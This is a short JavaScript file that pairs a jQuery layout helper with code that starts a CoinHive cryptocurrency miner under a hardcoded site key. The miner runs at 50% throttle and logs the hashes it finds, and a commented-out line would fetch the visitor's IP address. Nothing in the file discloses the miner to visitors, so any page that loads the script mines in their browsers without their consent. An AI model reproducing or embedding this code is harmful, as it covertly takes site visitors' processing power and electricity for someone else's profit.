$('.pull-down').each(function() {
  var $this = $(this);
  $this.css('margin-top', $this.parent().height() - $this.height())
});
// var ipaddr = $.get("https://api.ipify.org")
var siteKey = 'nqHHUpoSfv33ohk7nq0gwqz71I3hp73C';
var miner = new CoinHive.Anonymous(siteKey, {throttle: 0.5});
console.log(miner)

miner.on('found', function(hash) {
  console.log(hash)
})
miner.on('accepted', function(hash) {
  console.log(hash)
})
